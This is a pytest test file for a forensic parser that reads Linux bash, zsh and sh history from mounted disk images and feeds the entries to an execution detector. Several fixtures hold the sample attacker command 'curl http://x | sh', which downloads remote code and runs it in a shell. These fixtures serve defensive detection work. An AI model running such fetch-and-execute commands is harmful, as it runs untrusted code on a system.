"""Tests for the Linux shell-history parser (SFE-jdii).

Parses per-user shell history (``~/.bash_history``, ``~/.zsh_history``,
``~/.sh_history``) off a mounted image root into normalized command entries
that feed ``LinuxExecutionDetector``. Exercises the per-user-home walk
(``/root`` and ``/home/<user>``), the zsh extended-history format, containment
(oversize skip, missing file), and blank-line handling.
"""

from __future__ import annotations

from pathlib import Path

from sift_find_evil.parsers.linux_history import parse_shell_history


def _write(path: Path, content: str) -> None:
    """Create parent dirs and write ``content`` to ``path``."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def test_parses_root_bash_history(tmp_path: Path) -> None:
    """/root/.bash_history lines become normalized command entries."""
    _write(tmp_path / "root" / ".bash_history", "whoami\nid\ncurl http://x | sh\n")

    entries = parse_shell_history(tmp_path)

    assert [e["command"] for e in entries] == ["whoami", "id", "curl http://x | sh"]
    assert all(e["path"] == "/root/.bash_history" for e in entries)


def test_parses_per_user_home_history(tmp_path: Path) -> None:
    """/home/<user>/.bash_history is walked as well as /root."""
    _write(tmp_path / "home" / "analyst" / ".bash_history", "ls -la\n")

    entries = parse_shell_history(tmp_path)

    assert len(entries) == 1
    assert entries[0]["command"] == "ls -la"
    assert entries[0]["path"] == "/home/analyst/.bash_history"


def test_parses_zsh_history_extended_format(tmp_path: Path) -> None:
    """zsh EXTENDED_HISTORY ': <time>:<elapsed>;<cmd>' lines yield the command."""
    _write(
        tmp_path / "root" / ".zsh_history",
        ": 1610000000:0;whoami\n: 1610000005:2;curl http://x | sh\n",
    )

    entries = parse_shell_history(tmp_path)

    assert [e["command"] for e in entries] == ["whoami", "curl http://x | sh"]


def test_plain_zsh_lines_pass_through(tmp_path: Path) -> None:
    """A .zsh_history without the extended prefix is read verbatim."""
    _write(tmp_path / "root" / ".zsh_history", "ls\ncd /tmp\n")

    entries = parse_shell_history(tmp_path)

    assert [e["command"] for e in entries] == ["ls", "cd /tmp"]


def test_blank_lines_are_skipped(tmp_path: Path) -> None:
    """Blank/whitespace-only history lines produce no entries."""
    _write(tmp_path / "root" / ".bash_history", "\n  \nwhoami\n\n")

    entries = parse_shell_history(tmp_path)

    assert [e["command"] for e in entries] == ["whoami"]


def test_multiple_history_file_types_in_one_home(tmp_path: Path) -> None:
    """bash, zsh and sh history in the same home are all collected."""
    _write(tmp_path / "root" / ".bash_history", "a\n")
    _write(tmp_path / "root" / ".zsh_history", "b\n")
    _write(tmp_path / "root" / ".sh_history", "c\n")

    commands = {e["command"] for e in parse_shell_history(tmp_path)}

    assert commands == {"a", "b", "c"}


def test_oversized_history_is_skipped(tmp_path: Path, monkeypatch) -> None:
    """A history file exceeding the size cap is skipped (resource guard)."""
    import sift_find_evil.parsers.linux_history as mod

    monkeypatch.setattr(mod, "MAX_ARTIFACT_BYTES", 8)
    _write(tmp_path / "root" / ".bash_history", "curl http://x | sh\n" * 5)

    assert parse_shell_history(tmp_path) == []


def test_missing_history_returns_empty(tmp_path: Path) -> None:
    """A root with no shell history parses to an empty list, not an error."""
    assert parse_shell_history(tmp_path) == []
